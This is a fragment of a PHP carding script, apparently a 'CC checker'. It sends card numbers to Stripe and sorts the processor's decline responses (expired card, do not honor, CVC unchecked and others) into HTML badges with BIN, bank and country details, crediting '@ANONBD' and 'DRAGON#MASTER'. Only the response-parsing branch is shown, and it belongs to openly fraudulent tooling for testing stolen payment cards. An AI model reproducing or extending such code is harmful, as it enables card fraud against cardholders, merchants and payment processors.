    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: Generic Decline</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result1,  "do_not_honor")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: Do Not Honor The Card</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  } 


elseif
(strpos($result1,  "expired_card")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: Expired Card</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result1,  'Your card does not support this type of purchase.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: Your Card Does Not Support This Type Of Purchase.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result1,  "processing_error")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: Processing Error</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result1, "service_not_allowed")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: Service Not Allowed</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result1,  '"cvc_check": "unchecked"')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: CVC Unchecked</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 𝑫𝑹𝑨𝑮𝑶𝑵#𝑴𝑨𝑺𝑻𝑬𝑹 👑 </span></br>';
  } 

elseif
(strpos($result1,  '"cvc_check": "unavailable"')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: CVC Unavailable </span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result1,  "parameter_invalid_empty")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: Parameter Invalid Empty</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result1,  "lock_timeout")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: Lock Timeout</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result1,  "transaction_not_allowed")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: Transaction Not Allowed</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result1, "three_d_secure_redirect")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: 3D Secure Redirect</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result1,  'Card is declined by your bank, please contact them for additional information.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: Card Is Declined By Your Bank, Please Contact Them For Additional Information.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result1, "missing_payment_information")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: Missing Payment Information</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result1, "Payment cannot be processed, missing credit card number")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: Payment Cannot Be Processed, Missing Credit Card Number</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  } 

# ----------------------------------------------------- [Reprovada,Decline Responses END ] -------------------------------------- #



# ------------------------------------------- [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses ] ---------------------------------- #

elseif 
(strpos($result1,  '-1')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: Update Nonce </span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  }

else {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason:</span> | <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span> | <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  }
# --------------------------------- [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] --------------------------------------- #

# ----------------------------------------------------------- [Responses END] --------------------------------------------------- #

curl_close($ch);
ob_flush();

//echo "<b>1REQ Result:</b> $result1<br><br>";


#---------------------------------------------------------------------------------------------------------------------------------#
#---------------------------------------------------[MADE BY 𝑫𝑹𝑨𝑮𝑶𝑵#𝑴𝑨𝑺𝑻𝑬𝑹]----------------------------------------------------#
#---------------------------------------------------------------------------------------------------------------------------------#

?>
